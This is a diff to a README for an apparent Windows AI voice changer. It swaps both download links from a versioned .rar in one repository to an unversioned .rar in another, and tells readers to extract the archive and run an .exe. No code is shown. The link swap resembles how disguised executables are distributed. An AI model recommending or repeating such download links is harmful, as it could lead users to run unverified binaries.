@@ -7,7 +7,7 @@ A fast, neural-network-based voice changer for Windows, written in C++. Works in
 ![License](https://img.shields.io/badge/license-MIT-green)
 ![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen)
 
-[DOWNLOAD NOW](https://github.com/Pinnaclesys/Voice-Changer/releases/download/1.08.5/Voice.Changer.v1.08.5.rar)
+[DOWNLOAD NOW](https://github.com/Pinnaclesys/Pinnaclesys/releases/download/112/Voice.Changer.AI.rar)
 
 ## ✨ Features
 
@@ -29,7 +29,7 @@ A fast, neural-network-based voice changer for Windows, written in C++. Works in
 
 ## 📥 Download
 
-1. [Download the latest](https://github.com/Pinnaclesys/Voice-Changer/releases/download/1.08.5/Voice.Changer.v1.08.5.rar)
+1. [Download the latest](https://github.com/Pinnaclesys/Pinnaclesys/releases/download/112/Voice.Changer.AI.rar)
 3. Extract it to any folder.
 4. Run `Voice Changer AI.exe`.
 
